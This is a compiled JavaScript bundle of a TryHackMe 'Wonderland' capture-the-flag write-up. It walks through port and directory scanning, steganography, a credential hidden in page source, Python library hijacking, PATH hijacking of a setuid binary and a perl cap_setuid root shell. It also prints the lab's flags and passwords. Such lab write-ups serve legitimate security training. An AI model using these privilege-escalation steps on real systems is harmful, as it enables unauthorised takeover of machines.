"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[1983],{3905:(e,n,t)=>{t.d(n,{Zo:()=>h,kt:()=>m});var r=t(67294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var s=r.createContext({}),d=function(e){var n=r.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},h=function(e){var n=d(e.components);return r.createElement(s.Provider,{value:n},e.children)},p="mdxType",c={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},u=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,o=e.originalType,s=e.parentName,h=l(e,["components","mdxType","originalType","parentName"]),p=d(t),u=a,m=p["".concat(s,".").concat(u)]||p[u]||c[u]||o;return t?r.createElement(m,i(i({ref:n},h),{},{components:t})):r.createElement(m,i({ref:n},h))}));function m(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=t.length,i=new Array(o);i[0]=u;var l={};for(var s in n)hasOwnProperty.call(n,s)&&(l[s]=n[s]);l.originalType=e,l[p]="string"==typeof e?e:a,i[1]=l;for(var d=2;d<o;d++)i[d]=t[d];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}u.displayName="MDXCreateElement"},24512:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>s,contentTitle:()=>i,default:()=>c,frontMatter:()=>o,metadata:()=>l,toc:()=>d});var r=t(87462),a=(t(67294),t(3905));const o={},i="Wonderland",l={unversionedId:"Tryhackme/Wonderland/Wonderland",id:"Tryhackme/Wonderland/Wonderland",title:"Wonderland",description:"Fall down the rabbit hole and enter wonderland.",source:"@site/writeups/Tryhackme/Wonderland/Wonderland.md",sourceDirName:"Tryhackme/Wonderland",slug:"/Tryhackme/Wonderland/",permalink:"/writeups/Tryhackme/Wonderland/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Wireshark 101",permalink:"/writeups/Tryhackme/Wireshark 101/"},next:{title:"XXE",permalink:"/writeups/Tryhackme/XXE/"}},s={},d=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Capture the flags",id:"task-1-capture-the-flags",level:2}],h={toc:d},p="wrapper";function c(e){let{components:n,...t}=e;return(0,a.kt)(p,(0,r.Z)({},h,t,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"wonderland"},"Wonderland"),(0,a.kt)("p",null,"Fall down the rabbit hole and enter wonderland."),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/wonderland"},"Wonderland")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web ENumeration"),(0,a.kt)("li",{parentName:"ul"},"Steganography"),(0,a.kt)("li",{parentName:"ul"},"Web Poking"),(0,a.kt)("li",{parentName:"ul"},"Misconfigured Binaries"),(0,a.kt)("li",{parentName:"ul"},"Reverse Engineering")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-capture-the-flags"},"Task 1 Capture the flags"),(0,a.kt)("p",null,"Enter Wonderland and capture the flags."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Wonderland$ sudo nmap -A -sS -sC -sV -O 10.10.118.56\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 10:42 CEST\nNmap scan report for 10.10.118.56\nHost is up (0.033s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)\n|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)\n|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)\n80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Follow the white rabbit.\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/11%OT=22%CT=1%CU=39233%PV=Y%DS=2%DC=T%G=Y%TM=5F82C5\nOS:AD%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST\nOS:11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 21/tcp)\nHOP RTT      ADDRESS\n1   36.40 ms 10.8.0.1\n2   36.69 ms 10.10.118.56\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 30.47 seconds\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Wonderland$ gobuster dir -u 10.10.118.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.118.56\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/11 10:44:47 Starting gobuster\n===============================================================\n/img (Status: 301)\n/r (Status: 301)\nProgress: 14638 / 220561 (6.64%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/11 10:45:51 Finished\n===============================================================\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.118.56/img/"},"http://10.10.118.56/img/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Wonderland$ exiftool alice_door.jpg\nExifTool Version Number         : 12.06\nFile Name                       : alice_door.jpg\nDirectory                       : .\nFile Size                       : 1520 kB\nFile Modification Date/Time     : 2020:05:25 18:34:52+02:00\nFile Access Date/Time           : 2020:10:11 10:46:46+02:00\nFile Inode Change Date/Time     : 2020:10:11 10:46:46+02:00\nFile Permissions                : rw-r--r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nJFIF Version                    : 1.02\nExif Byte Order                 : Big-endian (Motorola, MM)\nOrientation                     : Horizontal (normal)\nX Resolution                    : 600\nY Resolution                    : 600\nResolution Unit                 : inches\nSoftware                        : Adobe Photoshop CS3 Macintosh\nModify Date                     : 2008:01:20 01:49:10\nColor Space                     : Uncalibrated\nExif Image Width                : 1962\nExif Image Height               : 1942\nCompression                     : JPEG (old-style)\nThumbnail Offset                : 332\nThumbnail Length                : 12311\nCurrent IPTC Digest             : 460cf28926b856dab09c01a1b0a79077\nApplication Record Version      : 2\nIPTC Digest                     : 460cf28926b856dab09c01a1b0a79077\nDisplayed Units X               : inches\nDisplayed Units Y               : inches\nPrint Style                     : Centered\nPrint Position                  : 0 0\nPrint Scale                     : 1\nGlobal Angle                    : 30\nGlobal Altitude                 : 30\nCopyright Flag                  : False\nURL List                        :\nSlices Group Name               : De_Alice's_Abenteuer_im_Wunderland_Carroll_pic_03\nNum Slices                      : 1\nPixel Aspect Ratio              : 1\nPhotoshop Thumbnail             : (Binary data 12311 bytes, use -b option to extract)\nHas Real Merged Data            : Yes\nWriter Name                     : Adobe Photoshop\nReader Name                     : Adobe Photoshop CS3\nPhotoshop Quality               : 12\nPhotoshop Format                : Progressive\nProgressive Scans               : 3 Scans\nXMP Toolkit                     : Adobe XMP Core 4.1-c036 46.276720, Mon Feb 19 2007 22:13:43\nCreate Date                     : 2008:01:20 01:47:53-05:00\nMetadata Date                   : 2008:01:20 01:49:10-05:00\nCreator Tool                    : Adobe Photoshop CS3 Macintosh\nFormat                          : image/jpeg\nColor Mode                      : RGB\nHistory                         :\nInstance ID                     : uuid:436B87178CC8DC11A35E97C268772518\nNative Digest                   : 256,257,258,259,262,274,277,284,530,531,282,283,296,301,318,319,529,532,306,270,271,272,305,315,33432;75A2F56A7448AE47A140395308BA4302\nDCT Encode Version              : 100\nAPP14 Flags 0                   : [14]\nAPP14 Flags 1                   : (none)\nColor Transform                 : YCbCr\nImage Width                     : 1962\nImage Height                    : 1942\nEncoding Process                : Progressive DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)\nImage Size                      : 1962x1942\nMegapixels                      : 3.8\nThumbnail Image                 : (Binary data 12311 bytes, use -b option to extract)\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Wonderland$ exiftool alice_door.png\nExifTool Version Number         : 12.06\nFile Name                       : alice_door.png\nDirectory                       : .\nFile Size                       : 1800 kB\nFile Modification Date/Time     : 2020:06:02 00:23:17+02:00\nFile Access Date/Time           : 2020:10:11 10:47:01+02:00\nFile Inode Change Date/Time     : 2020:10:11 10:47:01+02:00\nFile Permissions                : rw-r--r--\nFile Type                       : PNG\nFile Type Extension             : png\nMIME Type                       : image/png\nImage Width                     : 1962\nImage Height                    : 1942\nBit Depth                       : 8\nColor Type                      : RGB with Alpha\nCompression                     : Deflate/Inflate\nFilter                          : Adaptive\nInterlace                       : Noninterlaced\nSRGB Rendering                  : Perceptual\nGamma                           : 2.2\nPixels Per Unit X               : 23622\nPixels Per Unit Y               : 23622\nPixel Units                     : meters\nImage Size                      : 1962x1942\nMegapixels                      : 3.8\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Wonderland$ exiftool white_rabbit_1.jpg\nExifTool Version Number         : 12.06\nFile Name                       : white_rabbit_1.jpg\nDirectory                       : .\nFile Size                       : 1947 kB\nFile Modification Date/Time     : 2020:05:25 18:25:28+02:00\nFile Access Date/Time           : 2020:10:11 10:47:08+02:00\nFile Inode Change Date/Time     : 2020:10:11 10:47:08+02:00\nFile Permissions                : rw-r--r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nJFIF Version                    : 1.01\nResolution Unit                 : inches\nX Resolution                    : 594\nY Resolution                    : 594\nImage Width                     : 1102\nImage Height                    : 1565\nEncoding Process                : Baseline DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:2:2 (2 1)\nImage Size                      : 1102x1565\nMegapixels                      : 1.7\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Wonderland$ steghide extract -sf white_rabbit_1.jpg\nEnter passphrase:\nwrote extracted data to "hint.txt".\nkali@kali:~/CTFs/tryhackme/Wonderland$ cat hint.txt\nfollow the r a b b i t\n')),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"view-source:http://10.10.118.56/r/"},"view-source:http://10.10.118.56/r/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<head>\n  <title>Follow the white rabbit.</title>\n  <link rel="stylesheet" type="text/css" href="/main.css" />\n</head>\n<body>\n  <h1>Keep Going.</h1>\n  <p>"Would you tell me, please, which way I ought to go from here?"</p>\n</body>\n')),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"view-source:http://10.10.118.56/r/a/"},"view-source:http://10.10.118.56/r/a/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<head>\n  <title>Follow the white rabbit.</title>\n  <link rel="stylesheet" type="text/css" href="/main.css" />\n</head>\n<body>\n  <h1>Keep Going.</h1>\n  <p>"That depends a good deal on where you want to get to," said the Cat.</p>\n</body>\n')),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"view-source:http://10.10.118.56/r/a/b/"},"view-source:http://10.10.118.56/r/a/b/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<head>\n  <title>Follow the white rabbit.</title>\n  <link rel="stylesheet" type="text/css" href="/main.css" />\n</head>\n<body>\n  <h1>Keep Going.</h1>\n  <p>"I don\u2019t much care where\u2014" said Alice.</p>\n</body>\n')),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"view-source:http://10.10.118.56/r/a/b/b/"},"view-source:http://10.10.118.56/r/a/b/b/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<head>\n  <title>Follow the white rabbit.</title>\n  <link rel="stylesheet" type="text/css" href="/main.css" />\n</head>\n<body>\n  <h1>Keep Going.</h1>\n  <p>"Then it doesn\u2019t matter which way you go," said the Cat.</p>\n</body>\n')),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"view-source:http://10.10.118.56/r/a/b/b/i/"},"view-source:http://10.10.118.56/r/a/b/b/i/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'<!DOCTYPE html>\n<head>\n  <title>Follow the white rabbit.</title>\n  <link rel="stylesheet" type="text/css" href="/main.css" />\n</head>\n<body>\n  <h1>Keep Going.</h1>\n  <p>"\u2014so long as I get somewhere,"" Alice added as an explanation.</p>\n</body>\n')),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"view-source:http://10.10.118.56/r/a/b/b/i/t/"},"view-source:http://10.10.118.56/r/a/b/b/i/t/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'<!DOCTYPE html>\n\n<head>\n    <title>Enter wonderland</title>\n    <link rel="stylesheet" type="text/css" href="/main.css">\n</head>\n\n<body>\n    <h1>Open the door and enter wonderland</h1>\n    <p>"Oh, you\u2019re sure to do that," said the Cat, "if you only walk long enough."</p>\n    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"\n    </p>\n    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving\n        the other paw, "lives a March Hare. Visit either you like: they\u2019re both mad."</p>\n    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>\n    <img src="/img/alice_door.png" style="height: 50rem;">\n</body>\n')),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"alice:HowDothTheLittleCrocodileImproveHisShiningTail")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Wonderland$ ssh alice@10.10.118.56\nThe authenticity of host '10.10.118.56 (10.10.118.56)' can't be established.\nECDSA key fingerprint is SHA256:HUoT05UWCcf3WRhR5kF7yKX1yqUvNhjqtxuUMyOeqR8.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.118.56' (ECDSA) to the list of known hosts.\nalice@10.10.118.56's password:\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun Oct 11 08:54:30 UTC 2020\n\n  System load:  0.0                Processes:           84\n  Usage of /:   18.9% of 19.56GB   Users logged in:     0\n  Memory usage: 28%                IP address for eth0: 10.10.118.56\n  Swap usage:   0%\n\n\n0 packages can be updated.\n0 updates are security updates.\n\n\nLast login: Mon May 25 16:37:21 2020 from 192.168.170.1\nalice@wonderland:~$ ls -la\ntotal 40\ndrwxr-xr-x 5 alice alice 4096 May 25 17:52 .\ndrwxr-xr-x 6 root  root  4096 May 25 17:52 ..\nlrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -> /dev/null\n-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout\n-rw-r--r-- 1 alice alice 3771 May 25 02:36 .bashrc\ndrwx------ 2 alice alice 4096 May 25 16:37 .cache\ndrwx------ 3 alice alice 4096 May 25 16:37 .gnupg\ndrwxrwxr-x 3 alice alice 4096 May 25 02:52 .local\n-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile\n-rw------- 1 root  root    66 May 25 17:08 root.txt\n-rw-r--r-- 1 root  root  3577 May 25 02:43 walrus_and_the_carpenter.py\nalice@wonderland:~$ ls -la /root\nls: cannot open directory '/root': Permission denied\nalice@wonderland:~$ cat /root/user.txt\nthm{\"Curiouser and curiouser!\"}\nalice@wonderland:~$\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'alice@wonderland:~$ sudo -l\n[sudo] password for alice:\nMatching Defaults entries for alice on wonderland:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser alice may run the following commands on wonderland:\n    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py\n\nalice@wonderland:~$ /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py\nThe line was:    And this was odd, because, you know,\nThe line was:    Are very good indeed \u2014\nThe line was:    "The night is fine," the Walrus said\nThe line was:    And made them trot so quick!"\nThe line was:    And you are very nice!"\nThe line was:    And shed a bitter tear.\nThe line was:    Their shoes were clean and neat \u2014\nThe line was:    Were walking close at hand;\nThe line was:    Four other Oysters followed them,\nThe line was:    He did his very best to make\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'alice@wonderland:~$ cd /home/alice/\nalice@wonderland:~$ cat > random.py << EOF\n> import os\n> os.system("/bin/bash")\n> EOF\nalice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py\nrabbit@wonderland:~$ whoami\nrabbit\nrabbit@wonderland:~$ cd ~\nrabbit@wonderland:~$ pwd\n/home/alice\nrabbit@wonderland:~$ cd /home/rabbit/\nrabbit@wonderland:/home/rabbit$ ls -la\ntotal 40\ndrwxr-x--- 2 rabbit rabbit  4096 May 25 17:58 .\ndrwxr-xr-x 6 root   root    4096 May 25 17:52 ..\nlrwxrwxrwx 1 root   root       9 May 25 17:53 .bash_history -> /dev/null\n-rw-r--r-- 1 rabbit rabbit   220 May 25 03:01 .bash_logout\n-rw-r--r-- 1 rabbit rabbit  3771 May 25 03:01 .bashrc\n-rw-r--r-- 1 rabbit rabbit   807 May 25 03:01 .profile\n-rwsr-sr-x 1 root   root   16816 May 25 17:58 teaParty\nrabbit@wonderland:/home/rabbit$ file teaParty\nteaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped\nrabbit@wonderland:/home/rabbit$ ./teaParty\nWelcome to the tea party!\nThe Mad Hatter will be here soon.\nProbably by Sun, 11 Oct 2020 09:59:45 +0000\nAsk very nicely, and I will give you some tea while you wait for him\ntea\nSegmentation fault (core dumped)\nrabbit@wonderland:/home/rabbit$\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"python3 -m http.server\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Wonderland$ strings teaParty\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-c"},"Welcome to the tea party!\nThe Mad Hatter will be here soon.\n/bin/echo -n 'Probably by ' && date --date='next hour' -R\nAsk very nicely, and I will give you some tea while you wait for him\nSegmentation fault (core dumped)\n;*3$\"\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"rabbit@wonderland:/home/rabbit$ mkdir attack\nrabbit@wonderland:/home/rabbit$ nano date\nUnable to create directory /home/alice/.local/share/nano/: Permission denied\nIt is required for saving/loading search history or cursor positions.\n\nPress Enter to continue\n\nrabbit@wonderland:/home/rabbit$ ls\nattack  date  teaParty\nrabbit@wonderland:/home/rabbit$ cp date ./attack/\nrabbit@wonderland:/home/rabbit$ rm date\nrabbit@wonderland:/home/rabbit$ chmod +x attack/date\nrabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit/attack/:$PATH\nrabbit@wonderland:/home/rabbit$ ./teaParty\nWelcome to the tea party!\nThe Mad Hatter will be here soon.\nProbably by hatter@wonderland:/home/rabbit$ whoami\nhatter\nhatter@wonderland:/home/rabbit$\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"hatter@wonderland:/home/rabbit$ cd /home/hatter/\nhatter@wonderland:/home/hatter$ ls -la\ntotal 28\ndrwxr-x--- 3 hatter hatter 4096 May 25 22:56 .\ndrwxr-xr-x 6 root   root   4096 May 25 17:52 ..\nlrwxrwxrwx 1 root   root      9 May 25 17:53 .bash_history -> /dev/null\n-rw-r--r-- 1 hatter hatter  220 May 25 02:58 .bash_logout\n-rw-r--r-- 1 hatter hatter 3771 May 25 02:58 .bashrc\ndrwxrwxr-x 3 hatter hatter 4096 May 25 03:42 .local\n-rw-r--r-- 1 hatter hatter  807 May 25 02:58 .profile\n-rw------- 1 hatter hatter   29 May 25 22:56 password.txt\nhatter@wonderland:/home/hatter$ cat password.txt\nWhyIsARavenLikeAWritingDesk?\nhatter@wonderland:/home/hatter$ getcap -r / 2>/dev/null\n/usr/bin/perl5.26.1 = cap_setuid+ep\n/usr/bin/mtr-packet = cap_net_raw+ep\n/usr/bin/perl = cap_setuid+ep\nhatter@wonderland:/home/hatter$ su hatter\nPassword:\nhatter@wonderland:~$ id\nuid=1003(hatter) gid=1003(hatter) groups=1003(hatter)\nhatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'\nroot@wonderland:~# cat /home/alice/root.txt\nthm{Twinkle, twinkle, little bat! How I wonder what you\u2019re at!}\nroot@wonderland:~#\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/perl/#sudo"},"https://gtfobins.github.io/gtfobins/perl/#sudo")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Obtain the flag in user.txt")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},'thm{"Curiouser and curiouser!"}')),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Escalate your privileges, what is the flag in root.txt?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"thm{Twinkle, twinkle, little bat! How I wonder what you\u2019re at!}")))}c.isMDXComponent=!0}}]);